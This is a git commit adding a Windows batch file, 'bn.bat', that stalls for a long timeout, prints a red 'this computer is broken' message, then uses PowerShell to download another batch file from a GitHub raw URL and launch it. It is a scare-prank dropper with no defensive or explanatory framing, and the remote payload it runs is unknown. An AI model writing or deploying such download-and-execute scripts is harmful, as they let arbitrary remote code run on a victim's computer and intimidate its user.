7d8a241bb6734f689309d041b284c1c65ff3b235
LKR-beta <gbu23224@gmail.com>
2024-08-14 09:24:51 +0900

    Add files via upload

---
+++ bn.bat
@@ -0,0 +1,24 @@
+@echo off 
+cls
+
+timeout /t 1000 /nobreak > NUL
+
+echo in %date%  %time%
+
+timeout /t 2 /nobreak > NUL
+
+echo this computer is
+
+timeout /t 3 /nobreak > NUL
+
+color 4
+
+echo broken
+
+goto hate
+
+:hate
+powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/LKR-beta/nope/raw/main/video.bat','C:\your\asylum\video.bat')"
+start video.bat
+pause
+exit
